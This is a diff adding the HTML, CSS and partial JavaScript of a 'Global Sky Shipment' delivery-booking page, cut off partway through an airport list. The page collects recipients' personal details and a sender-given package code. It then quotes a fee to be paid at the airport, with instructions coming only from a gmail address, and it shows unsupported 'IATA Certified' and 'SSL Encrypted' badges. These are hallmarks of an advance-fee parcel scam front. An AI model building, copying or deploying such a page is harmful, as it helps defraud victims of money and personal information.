@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Global Sky Shipment — Book a Delivery</title>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:ital,wght@0,300;0,400;0,500;0,600;1,300&display=swap" rel="stylesheet" />
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #03091f;
+    --surface: #070f2b;
+    --surface2: #0b1638;
+    --surface3: #0f1d45;
+    --border: rgba(96,165,250,0.1);
+    --border2: rgba(96,165,250,0.2);
+    --blue: #2563eb;
+    --blue-bright: #3b82f6;
+    --blue-light: #60a5fa;
+    --blue-dim: rgba(59,130,246,0.12);
+    --blue-glow: rgba(37,99,235,0.25);
+    --white: #ffffff;
+    --text: #e8f0ff;
+    --muted: #6b8ec7;
+    --muted2: #4a6fa5;
+    --success: #22c55e;
+    --danger: #ef4444;
+    --warning: #f59e0b;
+  }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* ─── Background ─── */
+  .bg-layer {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background:
+      radial-gradient(ellipse 70% 50% at 50% -10%, rgba(37,99,235,0.18) 0%, transparent 60%),
+      radial-gradient(ellipse 40% 40% at 90% 90%, rgba(59,130,246,0.08) 0%, transparent 60%),
+      radial-gradient(ellipse 30% 30% at 5% 80%, rgba(37,99,235,0.06) 0%, transparent 60%);
+  }
+  .grid-layer {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background-image:
+      linear-gradient(rgba(59,130,246,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(59,130,246,0.04) 1px, transparent 1px);
+    background-size: 48px 48px;
+  }
+  .stars {
+    position: fixed; inset: 0; pointer-events: none; z-index: 0;
+    background:
+      radial-gradient(1px 1px at 12% 8%,  rgba(255,255,255,0.7) 0%, transparent 100%),
+      radial-gradient(1px 1px at 78% 12%, rgba(255,255,255,0.6) 0%, transparent 100%),
+      radial-gradient(1px 1px at 42% 68%, rgba(255,255,255,0.5) 0%, transparent 100%),
+      radial-gradient(1px 1px at 88% 55%, rgba(255,255,255,0.6) 0%, transparent 100%),
+      radial-gradient(1px 1px at 22% 88%, rgba(255,255,255,0.5) 0%, transparent 100%),
+      radial-gradient(1px 1px at 63% 32%, rgba(255,255,255,0.7) 0%, transparent 100%),
+      radial-gradient(2px 2px at 35% 22%, rgba(96,165,250,0.6) 0%, transparent 100%),
+      radial-gradient(2px 2px at 72% 78%, rgba(96,165,250,0.5) 0%, transparent 100%),
+      radial-gradient(1px 1px at 50% 50%, rgba(255,255,255,0.4) 0%, transparent 100%),
+      radial-gradient(1px 1px at 18% 45%, rgba(255,255,255,0.5) 0%, transparent 100%),
+      radial-gradient(1px 1px at 95% 30%, rgba(255,255,255,0.4) 0%, transparent 100%),
+      radial-gradient(1px 1px at 5%  55%, rgba(255,255,255,0.5) 0%, transparent 100%);
+  }
+
+  /* ─── Header ─── */
+  header {
+    position: relative; z-index: 10;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 1rem 1.5rem;
+    border-bottom: 1px solid var(--border);
+    backdrop-filter: blur(16px);
+    background: rgba(3,9,31,0.75);
+    flex-wrap: wrap; gap: 0.5rem;
+  }
+  .logo { display: flex; align-items: center; gap: 0.85rem; text-decoration: none; }
+  .logo-svg-wrap {
+    width: 46px; height: 46px;
+    background: linear-gradient(135deg, #1d4ed8, #2563eb);
+    border-radius: 12px;
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 4px 18px rgba(37,99,235,0.45);
+    border: 1px solid rgba(96,165,250,0.25);
+    flex-shrink: 0;
+  }
+  .logo-text-wrap { display: flex; flex-direction: column; }
+  .logo-name {
+    font-family: 'Outfit', sans-serif;
+    font-size: 1.35rem; font-weight: 800;
+    letter-spacing: 1px;
+    background: linear-gradient(90deg, #ffffff 0%, #93c5fd 100%);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    line-height: 1;
+  }
+  .logo-tagline {
+    font-size: 0.58rem; font-weight: 500;
+    color: var(--muted); letter-spacing: 3px;
+    text-transform: uppercase; margin-top: 3px;
+  }
+  .header-right { display: flex; align-items: center; gap: 1rem; }
+  .header-badge {
+    font-family: 'Outfit', sans-serif; font-size: 0.7rem; font-weight: 500;
+    color: var(--blue-light);
+    border: 1px solid var(--border2);
+    background: var(--blue-dim);
+    padding: 0.3rem 0.85rem; border-radius: 20px; letter-spacing: 1px;
+  }
+
+  /* ─── Hero ─── */
+  .hero {
+    position: relative; z-index: 2;
+    text-align: center; padding: 2.5rem 1.25rem 1.5rem;
+  }
+  .hero-eyebrow {
+    display: inline-flex; align-items: center; gap: 0.5rem;
+    font-family: 'Outfit', sans-serif; font-size: 0.68rem; font-weight: 600;
+    color: var(--blue-light); letter-spacing: 3px; text-transform: uppercase;
+    margin-bottom: 1rem;
+    background: var(--blue-dim); border: 1px solid var(--border2);
+    padding: 0.35rem 0.85rem; border-radius: 20px;
+  }
+  .hero h1 {
+    font-family: 'Outfit', sans-serif; font-weight: 800;
+    font-size: clamp(2rem, 8vw, 5.5rem);
+    letter-spacing: -1px; line-height: 1.05;
+    color: #ffffff; margin-bottom: 0.6rem;
+  }
+  .hero h1 .blue-word {
+    background: linear-gradient(90deg, #60a5fa, #2563eb);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .hero p {
+    color: var(--muted); font-size: 1rem; font-weight: 300; letter-spacing: 0.3px;
+  }
+
+  /* ─── Progress Steps ─── */
+  .progress-bar {
+    position: relative; z-index: 2;
+    display: flex; align-items: center; justify-content: center;
+    gap: 0; max-width: 460px; margin: 2rem auto 0; padding: 0 1.5rem;
+  }
+  .step-item { display: flex; flex-direction: column; align-items: center; gap: 0.35rem; flex: 1; }
+  .step-num {
+    width: 30px; height: 30px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-family: 'Outfit', sans-serif; font-size: 0.75rem; font-weight: 700;
+    background: var(--surface3); border: 1.5px solid var(--border2); color: var(--muted);
+    transition: all 0.3s;
+  }
+  .step-num.done { background: var(--blue); border-color: var(--blue); color: #fff; }
+  .step-num.active { background: var(--blue-dim); border-color: var(--blue-bright); color: var(--blue-light); box-shadow: 0 0 12px var(--blue-glow); }
+  .step-label { font-size: 0.62rem; color: var(--muted); letter-spacing: 0.5px; text-align: center; }
+  .step-connector { height: 1.5px; flex: 1; background: var(--border); margin-top: -14px; }
+  .step-connector.done { background: var(--blue); opacity: 0.4; }
+
+  /* ─── Form Card ─── */
+  .form-wrapper {
+    position: relative; z-index: 2;
+    max-width: 740px; margin: 2rem auto 4rem; padding: 0 1rem;
+  }
+  .form-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 22px;
+    padding: clamp(1.25rem, 4vw, 2.5rem);
+    box-shadow: 0 30px 90px rgba(0,0,0,0.6), 0 0 0 1px rgba(96,165,250,0.04);
+    animation: slideUp 0.6s cubic-bezier(0.16,1,0.3,1) both;
+  }
+  @keyframes slideUp { from{opacity:0;transform:translateY(28px)} to{opacity:1;transform:translateY(0)} }
+
+  .section-label {
+    font-family: 'Outfit', sans-serif; font-size: 0.68rem; font-weight: 700;
+    letter-spacing: 3px; text-transform: uppercase;
+    color: var(--blue-light);
+    margin-bottom: 1.5rem; padding-bottom: 0.6rem;
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; gap: 0.6rem;
+  }
+  .section-label .snum {
+    width: 22px; height: 22px; border-radius: 6px;
+    background: var(--blue-dim); border: 1px solid var(--border2);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 0.65rem; color: var(--blue-light); font-weight: 700;
+  }
+
+  .field-grid {
+    display: grid; grid-template-columns: 1fr 1fr;
+    gap: 1.25rem; margin-bottom: 1.25rem;
+  }
+  .field-grid.full { grid-template-columns: 1fr; }
+  @media (max-width: 560px) { .field-grid { grid-template-columns: 1fr; } }
+
+  .field { display: flex; flex-direction: column; gap: 0.5rem; }
+
+  label {
+    font-size: 0.72rem; font-weight: 600;
+    color: var(--muted); letter-spacing: 0.8px;
+    text-transform: uppercase;
+  }
+
+  input, select, textarea {
+    background: var(--surface2);
+    border: 1.5px solid var(--border);
+    border-radius: 11px;
+    padding: 0.8rem 1rem;
+    color: var(--white);
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-size: 0.9rem; outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+    -webkit-appearance: none; appearance: none; width: 100%;
+  }
+  input::placeholder { color: var(--muted2); opacity: 0.7; }
+  input:focus, select:focus, textarea:focus {
+    border-color: var(--blue-bright);
+    box-shadow: 0 0 0 3px rgba(59,130,246,0.12);
+    background: var(--surface3);
+  }
+  select {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' fill='none'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236b8ec7' stroke-width='1.5' stroke-linecap='round'/%3E%3C/svg%3E");
+    background-repeat: no-repeat; background-position: right 1rem center;
+    padding-right: 2.5rem; cursor: pointer;
+  }
+  select option { background: #0b1638; color: #e8f0ff; }
+
+  .divider { height: 1px; background: var(--border); margin: 2rem 0; }
+
+  .input-hint {
+    font-size: 0.72rem; color: var(--muted2);
+    margin-top: 0.35rem; display: flex; align-items: center; gap: 0.35rem;
+  }
+
+  #airport-section { transition: opacity 0.3s, transform 0.3s; }
+  #airport-section.hidden { opacity: 0.25; pointer-events: none; }
+
+  /* ─── Submit Button ─── */
+  #submitBtn {
+    margin-top: 2rem; width: 100%; padding: 1.05rem;
+    background: linear-gradient(135deg, #2563eb, #1d4ed8);
+    border: none; border-radius: 12px; color: #fff;
+    font-family: 'Outfit', sans-serif; font-size: 1.05rem; font-weight: 700;
+    letter-spacing: 1.5px; cursor: pointer;
+    transition: transform 0.15s, box-shadow 0.15s, opacity 0.2s;
+    box-shadow: 0 4px 24px rgba(37,99,235,0.4);
+    display: flex; align-items: center; justify-content: center; gap: 0.6rem;
+  }
+  #submitBtn:hover { transform: translateY(-2px); box-shadow: 0 8px 32px rgba(37,99,235,0.55); }
+  #submitBtn:active { transform: translateY(0); }
+  #submitBtn:disabled { opacity: 0.35; cursor: not-allowed; transform: none; box-shadow: none; }
+
+  /* ─── Spinner Overlay ─── */
+  .overlay {
+    position: fixed; inset: 0; z-index: 100;
+    background: rgba(3,9,31,0.92);
+    backdrop-filter: blur(10px);
+    display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 1.5rem;
+    opacity: 0; pointer-events: none; transition: opacity 0.3s;
+  }
+  .overlay.active { opacity: 1; pointer-events: all; }
+
+  .spinner-wrap { position: relative; width: 90px; height: 90px; display: flex; align-items: center; justify-content: center; }
+  .ring-outer {
+    position: absolute; width: 90px; height: 90px; border-radius: 50%;
+    border: 2px solid rgba(96,165,250,0.15);
+    border-top-color: var(--blue-bright);
+    animation: spinRing 1s linear infinite;
+  }
+  .ring-inner {
+    position: absolute; width: 66px; height: 66px; border-radius: 50%;
+    border: 2px solid rgba(96,165,250,0.08);
+    border-bottom-color: #60a5fa;
+    animation: spinRing 0.7s linear infinite reverse;
+  }
+  @keyframes spinRing { to { transform: rotate(360deg); } }
+  .spin-icon { font-size: 1.6rem; animation: spinPulse 2s ease-in-out infinite; }
+  @keyframes spinPulse { 0%,100%{transform:scale(0.9);opacity:0.7} 50%{transform:scale(1.1);opacity:1} }
+
+  .spin-label {
+    font-family: 'Outfit', sans-serif; font-size: 0.8rem; font-weight: 600;
+    color: var(--blue-light); letter-spacing: 4px; text-transform: uppercase;
+    animation: pulseText 1.5s ease-in-out infinite;
+  }
+  @keyframes pulseText { 0%,100%{opacity:0.5} 50%{opacity:1} }
+  .spin-sub { font-size: 0.78rem; color: var(--muted); text-align: center; max-width: 240px; line-height: 1.6; }
+
+  /* ─── Fee Modal ─── */
+  .modal-backdrop {
+    position: fixed; inset: 0; z-index: 200;
+    background: rgba(3,9,31,0.88);
+    backdrop-filter: blur(12px);
+    display: flex; align-items: flex-start; justify-content: center;
+    padding: 1rem;
+    overflow-y: auto;
+    opacity: 0; pointer-events: none; transition: opacity 0.3s;
+  }
+  .modal-backdrop.active { opacity: 1; pointer-events: all; }
+
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--border2);
+    border-radius: 22px; max-width: 480px; width: 100%;
+    padding: clamp(1.25rem, 4vw, 2.5rem);
+    box-shadow: 0 40px 100px rgba(0,0,0,0.7), 0 0 60px rgba(37,99,235,0.1);
+    transform: translateY(20px) scale(0.97); transition: transform 0.3s;
+    margin: auto;
+  }
+  .modal-backdrop.active .modal { transform: translateY(0) scale(1); }
+
+  .modal-icon {
+    width: 54px; height: 54px; margin: 0 auto 1rem;
+    background: var(--blue-dim); border: 1px solid var(--border2);
+    border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem;
+  }
+  .modal h2 {
+    font-family: 'Outfit', sans-serif; font-size: clamp(1.3rem, 5vw, 1.7rem); font-weight: 800;
+    text-align: center; margin-bottom: 0.4rem; color: #fff;
+  }
+  .modal-subtitle { text-align: center; color: var(--muted); font-size: 0.82rem; margin-bottom: 1.25rem; line-height: 1.6; }
+
+  .fee-display {
+    background: linear-gradient(135deg, rgba(37,99,235,0.15), rgba(29,78,216,0.1));
+    border: 1px solid var(--border2);
+    border-radius: 14px; padding: 1rem; text-align: center; margin-bottom: 1.25rem;
+  }
+  .fee-lbl { font-size: 0.68rem; letter-spacing: 3px; color: var(--muted); text-transform: uppercase; margin-bottom: 0.4rem; font-weight: 600; }
+  .fee-amt {
+    font-family: 'Outfit', sans-serif; font-size: clamp(2rem, 10vw, 3.2rem); font-weight: 800;
+    background: linear-gradient(90deg, #ffffff, #93c5fd);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    letter-spacing: -1px;
+  }
+  .fee-note { font-size: 0.72rem; color: var(--muted); margin-top: 0.3rem; }
+
+  .breakdown { display: flex; flex-direction: column; gap: 0.4rem; margin-bottom: 1.1rem; }
+  .brk-row {
+    display: flex; justify-content: space-between; align-items: center;
+    font-size: 0.8rem; color: var(--muted);
+    padding: 0.45rem 0; border-bottom: 1px solid var(--border);
+  }
+  .brk-row:last-child { border-bottom: none; }
+  .brk-row span:last-child { color: var(--text); font-weight: 600; }
+
+  /* Payment notice banner */
+  .payment-notice {
+    background: linear-gradient(135deg, rgba(245,158,11,0.1), rgba(245,158,11,0.05));
+    border: 1px solid rgba(245,158,11,0.35);
+    border-radius: 12px; padding: 0.9rem 1rem;
+    margin-bottom: 1.1rem;
+    display: flex; gap: 0.65rem; align-items: flex-start;
+  }
+  .payment-notice-icon { font-size: 1rem; flex-shrink: 0; margin-top: 1px; }
+  .payment-notice-text { font-size: 0.78rem; color: #fcd34d; line-height: 1.65; }
+  .payment-notice-text strong { color: #fbbf24; }
+  .payment-notice-email {
+    display: inline-block; margin-top: 0.3rem;
+    font-family: 'Outfit', monospace; font-size: 0.75rem;
+    background: rgba(245,158,11,0.15); border: 1px solid rgba(245,158,11,0.3);
+    color: #fcd34d; padding: 0.2rem 0.55rem; border-radius: 6px; letter-spacing: 0.3px;
+  }
+
+  /* Custom checkbox */
+  .agree-row {
+    display: flex; align-items: flex-start; gap: 0.75rem;
+    margin-bottom: 1.1rem; cursor: pointer;
+    padding: 0.85rem; background: var(--blue-dim); border: 1px solid var(--border);
+    border-radius: 10px; transition: border-color 0.2s;
+    user-select: none;
+  }
+  .agree-row:hover { border-color: var(--border2); }
+  .agree-row input[type="checkbox"] { display: none; }
+  .custom-check {
+    width: 20px; height: 20px; flex-shrink: 0; margin-top: 1px;
+    border: 2px solid var(--border2); border-radius: 6px;
+    background: var(--surface2);
+    display: flex; align-items: center; justify-content: center;
+    transition: all 0.2s; position: relative;
+  }
+  .custom-check svg { opacity: 0; transform: scale(0.5); transition: all 0.2s; }
+  .agree-row input[type="checkbox"]:checked ~ .agree-text-wrap .custom-check,
+  .custom-check.checked {
+    background: var(--blue); border-color: var(--blue-bright);
+    box-shadow: 0 0 10px rgba(59,130,246,0.4);
+  }
+  .custom-check.checked svg { opacity: 1; transform: scale(1); }
+  .agree-text { font-size: 0.82rem; color: var(--muted); line-height: 1.55; }
+  .agree-text strong { color: var(--blue-light); }
+
+  #continueBtn {
+    width: 100%; padding: 1.05rem;
+    background: linear-gradient(135deg, #2563eb, #1d4ed8);
+    border: none; border-radius: 12px; color: #fff;
+    font-family: 'Outfit', sans-serif; font-size: 1.05rem; font-weight: 700;
+    letter-spacing: 1px; cursor: pointer;
+    transition: all 0.2s; opacity: 0.3; pointer-events: none;
+    box-shadow: 0 4px 20px rgba(37,99,235,0.3);
+    display: flex; align-items: center; justify-content: center; gap: 0.5rem;
+  }
+  #continueBtn.ready { opacity: 1; pointer-events: all; }
+  #continueBtn.ready:hover { transform: translateY(-2px); box-shadow: 0 8px 28px rgba(37,99,235,0.5); }
+
+  /* ─── Footer ─── */
+  footer {
+    position: relative; z-index: 2;
+    border-top: 1px solid var(--border);
+    padding: 1.25rem 1.5rem;
+    display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.75rem;
+  }
+  footer p { font-size: 0.75rem; color: var(--muted2); }
+  .trust-row { display: flex; gap: 1.5rem; }
+  .trust-item { font-size: 0.7rem; color: var(--muted); display: flex; align-items: center; gap: 0.35rem; }
+  .trust-item::before { content: '✓'; color: var(--success); font-weight: 700; }
+</style>
+</head>
+<body>
+
+<div class="bg-layer"></div>
+<div class="grid-layer"></div>
+<div class="stars"></div>
+
+<!-- ─── HEADER ─── -->
+<header>
+  <a class="logo" href="#">
+    <img src="GLOBALSKY.png" alt="Global Sky Shipment" style="height:54px;width:auto;object-fit:contain;filter:brightness(1.1) drop-shadow(0 2px 8px rgba(37,99,235,0.4));" />
+  </a>
+  <div class="header-right">
+    <div class="header-badge">✈ 180+ Countries</div>
+  </div>
+</header>
+
+<!-- ─── HERO ─── -->
+<div class="hero">
+  <div class="hero-eyebrow">✦ Begin Your Shipment ✦</div>
+  <h1>SHIP <span class="blue-word">ANYWHERE</span><br>ON EARTH</h1>
+  <p>Fast. Reliable. Fully Traceable. Door-to-airport delivery worldwide.</p>
+</div>
+
+<!-- Progress Steps -->
+<div class="progress-bar">
+  <div class="step-item">
+    <div class="step-num active" id="st1">1</div>
+    <div class="step-label">Your Info</div>
+  </div>
+  <div class="step-connector" id="sc1"></div>
+  <div class="step-item">
+    <div class="step-num" id="st2">2</div>
+    <div class="step-label">Location</div>
+  </div>
+  <div class="step-connector" id="sc2"></div>
+  <div class="step-item">
+    <div class="step-num" id="st3">3</div>
+    <div class="step-label">Airport</div>
+  </div>
+  <div class="step-connector" id="sc3"></div>
+  <div class="step-item">
+    <div class="step-num" id="st4">4</div>
+    <div class="step-label">Confirm</div>
+  </div>
+</div>
+
+<!-- ─── FORM ─── -->
+<div class="form-wrapper">
+  <div class="form-card">
+
+    <div class="section-label"><span class="snum">01</span> Personal Information</div>
+
+    <div class="field-grid">
+      <div class="field">
+        <label>Full Name <span style="color:var(--muted2)">(Recipient)</span></label>
+        <input type="text" id="fullName" placeholder="e.g. James Adewale" autocomplete="name" />
+      </div>
+      <div class="field">
+        <label>Sender Name</label>
+        <input type="text" id="senderName" placeholder="e.g. Maria Kowalski" autocomplete="off" />
+      </div>
+    </div>
+    <div class="field-grid">
+      <div class="field">
+        <label>Phone Number</label>
+        <input type="tel" id="phone" placeholder="+1 (555) 000-0000" autocomplete="tel" />
+      </div>
+      <div class="field">
+        <label>Package Code <span style="color:var(--muted2)">(From Sender)</span></label>
+        <input type="text" id="packageNumber" placeholder="e.g. PKG-2847163905" autocomplete="off" style="text-transform:uppercase;letter-spacing:0.5px;" oninput="this.value=this.value.toUpperCase();checkForm()" />
+        <div class="input-hint">
+          <svg width="12" height="12" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="7" stroke="#6b8ec7" stroke-width="1.5"/><path d="M8 5v4M8 11v.5" stroke="#6b8ec7" stroke-width="1.5" stroke-linecap="round"/></svg>
+          Enter the package code given to you by your sender
+        </div>
+      </div>
+    </div>
+    <div class="field-grid full">
+      <div class="field">
+        <label>Email Address</label>
+        <input type="email" id="email" placeholder="you@example.com" autocomplete="email" />
+      </div>
+    </div>
+
+    <div class="divider"></div>
+    <div class="section-label"><span class="snum">02</span> Delivery Location</div>
+
+    <div class="field-grid full">
+      <div class="field">
+        <label>Country</label>
+        <select id="country" onchange="onCountryChange()">
+          <option value="">— Select your country —</option>
+          <!-- Africa -->
+          <optgroup label="─ Africa ─">
+            <option>Egypt</option>
+            <option>Ethiopia</option>
+            <option>Ghana</option>
+            <option>Kenya</option>
+            <option>Morocco</option>
+            <option>Nigeria</option>
+            <option>South Africa</option>
+            <option>Tanzania</option>
+          </optgroup>
+          <!-- Americas -->
+          <optgroup label="─ Americas ─">
+            <option>Brazil</option>
+            <option>Canada</option>
+            <option>Colombia</option>
+            <option>Mexico</option>
+            <option>United States</option>
+          </optgroup>
+          <!-- Asia — ALL -->
+          <optgroup label="─ Asia ─">
+            <option>Afghanistan</option>
+            <option>Armenia</option>
+            <option>Azerbaijan</option>
+            <option>Bahrain</option>
+            <option>Bangladesh</option>
+            <option>Bhutan</option>
+            <option>Brunei</option>
+            <option>Cambodia</option>
+            <option>China</option>
+            <option>Georgia</option>
+            <option>Hong Kong</option>
+            <option>India</option>
+            <option>Indonesia</option>
+            <option>Iran</option>
+            <option>Iraq</option>
+            <option>Israel</option>
+            <option>Japan</option>
+            <option>Jordan</option>
+            <option>Kazakhstan</option>
+            <option>Kuwait</option>
+            <option>Kyrgyzstan</option>
+            <option>Laos</option>
+            <option>Lebanon</option>
+            <option>Macau</option>
+            <option>Malaysia</option>
+            <option>Maldives</option>
+            <option>Mongolia</option>
+            <option>Myanmar</option>
+            <option>Nepal</option>
+            <option>North Korea</option>
+            <option>Oman</option>
+            <option>Pakistan</option>
+            <option>Philippines</option>
+            <option>Qatar</option>
+            <option>Saudi Arabia</option>
+            <option>Singapore</option>
+            <option>South Korea</option>
+            <option>Sri Lanka</option>
+            <option>Syria</option>
+            <option>Taiwan</option>
+            <option>Tajikistan</option>
+            <option>Thailand</option>
+            <option>Timor-Leste</option>
+            <option>Turkey</option>
+            <option>Turkmenistan</option>
+            <option>United Arab Emirates</option>
+            <option>Uzbekistan</option>
+            <option>Vietnam</option>
+            <option>Yemen</option>
+          </optgroup>
+          <!-- Europe -->
+          <optgroup label="─ Europe ─">
+            <option>France</option>
+            <option>Germany</option>
+            <option>Italy</option>
+            <option>Netherlands</option>
+            <option>Spain</option>
+            <option>United Kingdom</option>
+          </optgroup>
+          <!-- Oceania -->
+          <optgroup label="─ Oceania ─">
+            <option>Australia</option>
+            <option>New Zealand</option>
+          </optgroup>
+        </select>
+      </div>
+    </div>
+    <div class="field-grid full" style="margin-top:1.25rem">
+      <div class="field">
+        <label>Home / Pickup Address</label>
+        <input type="text" id="address" placeholder="Street, City, State / Province" autocomplete="street-address" />
+      </div>
+    </div>
+
+    <div class="divider"></div>
+    <div class="section-label"><span class="snum">03</span> Nearest Airport Hub</div>
+
+    <div id="airport-section" class="field-grid full hidden">
+      <div class="field">
+        <label>Select Airport</label>
+        <select id="airport" onchange="onAirportSelect()">
+          <option value="">— Select an airport —</option>
+        </select>
+        <div class="input-hint">
+          <svg width="12" height="12" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="7" stroke="#6b8ec7" stroke-width="1.5"/><path d="M8 5v4M8 11v.5" stroke="#6b8ec7" stroke-width="1.5" stroke-linecap="round"/></svg>
+          Your package will be routed through this hub
+        </div>
+      </div>
+    </div>
+    <p id="airport-hint" style="font-size:0.8rem;color:var(--muted2);margin-top:0.3rem">
+      ← Select a country above to see available airports
+    </p>
+
+    <button id="submitBtn" onclick="submitForm()" disabled>
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+      Confirm Booking Details
+    </button>
+
+  </div>
+</div>
+
+<!-- ─── FOOTER ─── -->
+<footer>
+  <p>© 2025 Global Sky Shipment Ltd. All rights reserved.</p>
+  <div class="trust-row">
+    <div class="trust-item">SSL Encrypted</div>
+    <div class="trust-item">IATA Certified</div>
+    <div class="trust-item">24/7 Live Support</div>
+  </div>
+</footer>
+
+<!-- ─── SPINNER ─── -->
+<div class="overlay" id="spinnerOverlay">
+  <div class="spinner-wrap">
+    <div class="ring-outer"></div>
+    <div class="ring-inner"></div>
+    <span class="spin-icon">✈️</span>
+  </div>
+  <div class="spin-label">Calculating Route…</div>
+  <p class="spin-sub">Finding the best air freight path from your chosen hub</p>
+</div>
+
+<!-- ─── FEE MODAL ─── -->
+<div class="modal-backdrop" id="feeModal">
+  <div class="modal">
+    <div class="modal-icon">📦</div>
+    <h2>Delivery Quote Ready</h2>
+    <p class="modal-subtitle">
+      Your package will be routed through <strong id="selectedAirportLabel" style="color:var(--blue-light)"></strong>. Review your fee breakdown below.
+    </p>
+
+    <div class="fee-display">
+      <div class="fee-lbl">Total Delivery Fee (USD)</div>
+      <div class="fee-amt" id="feeAmount">$0</div>
+      <div class="fee-note">One-time charge · Inclusive of all taxes</div>
+    </div>
+
+    <div class="breakdown">
+      <div class="brk-row"><span>Handling & Packaging</span><span id="brkHandling">—</span></div>
+      <div class="brk-row"><span>Air Freight</span><span id="brkFreight">—</span></div>
+      <div class="brk-row"><span>Customs Clearance</span><span id="brkCustoms">—</span></div>
+      <div class="brk-row"><span>Insurance Cover</span><span id="brkInsurance">—</span></div>
+    </div>
+
+    <!-- Payment timing notice -->
+    <div class="payment-notice">
+      <div class="payment-notice-icon">&#9888;&#65039;</div>
+      <div class="payment-notice-text">
+        <strong>Important &mdash; Payment Timing:</strong> You will <strong>only be required to pay this fee once your package has arrived at the airport</strong>. Do not pay before then.<br>
+        All official payment instructions will be sent exclusively from our verified email address:
+        <span class="payment-notice-email">globalskyshipment247@gmail.com</span><br>
+        <strong>This is our only official email.</strong> Beware of any other address claiming to represent us.
+      </div>
+    </div>
+
+    <label class="agree-row" id="agreeLabel" onclick="handleAgreeClick()">
+      <input type="checkbox" id="agreeCheck" />
+      <div style="display:flex;align-items:flex-start;gap:0.75rem;flex:1">
+        <div class="custom-check" id="customCheck">
+          <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+            <path d="M2 6l3 3 5-5" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <div class="agree-text">
+          I understand the delivery fee of <strong id="agreeAmt">$0</strong> is only payable when my package reaches the airport, and I accept Global Sky Shipment&apos;s
+          <strong>Terms of Service</strong> and <strong>Delivery Policy</strong>.
+        </div>
+      </div>
+    </label>
+
+    <div id="feeModalError" style="display:none;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.35);border-radius:10px;padding:0.7rem 0.9rem;margin-bottom:0.9rem;font-size:0.8rem;color:#fca5a5;line-height:1.5"></div>
+
+    <button id="continueBtn" onclick="sendOtp()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"/></svg>
+      Continue to Dashboard
+    </button>
+  </div>
+</div>
+
+<script>
+const AIRPORTS = {
+  // ── Africa ──
+  "Egypt": ["CAI — Cairo International","HRG — Hurghada International","SSH — Sharm el-Sheikh International","LXR — Luxor International","ASW — Aswan International","HBE — Alexandria Borg El Arab International"],
+  "Ethiopia": ["ADD — Addis Ababa Bole International","DIR — Dire Dawa International","GMB — Gambela Airport","MQX — Mekelle Airport"],
+  "Ghana": ["ACC — Kotoka International (Accra)","TML — Tamale Airport","KMS — Kumasi Airport"],
+  "Kenya": ["NBO — Nairobi Jomo Kenyatta International","MBA — Mombasa Moi International","WIL — Nairobi Wilson Airport","KIS — Kisumu International","MYD — Malindi Airport"],
+  "Morocco": ["CMN — Casablanca Mohammed V International","RAK — Marrakesh Menara International","FEZ — Fez-Saïs Airport","TNG — Tangier Ibn Battuta Airport","AGA — Agadir Al-Massira International"],
+  "Nigeria": ["LOS — Murtala Muhammed International (Lagos)","ABV — Nnamdi Azikiwe International (Abuja)","KAN — Mallam Aminu Kano International","PHC — Port Harcourt International","ENU — Akanu Ibiam International (Enugu)","ILR — Ilorin International","SKO — Sadiq Abubakar III International (Sokoto)","BNI — Benin Airport","CBQ — Margaret Ekpo International (Calabar)","ABB — Asaba International"],
+  "South Africa": ["JNB — Johannesburg O.R. Tambo International","CPT — Cape Town International","DUR — Durban King Shaka International","PLZ — Port Elizabeth Chief Dawid Stuurman","ELS — East London Airport","GRJ — George Airport"],
+  "Tanzania": ["DAR — Dar es Salaam Julius Nyerere International","JRO — Kilimanjaro International","ZNZ — Zanzibar Abeid Amani Karume International"],
+
+  // ── Americas ──
+  "Brazil": ["GRU — São Paulo Guarulhos International","GIG — Rio de Janeiro Galeão International","BSB — Brasília International","CNF — Belo Horizonte Tancredo Neves International","SSA — Salvador Luís Eduardo Magalhães International","FOR — Fortaleza Pinto Martins International","POA — Porto Alegre Salgado Filho International","REC — Recife Guararapes International"],
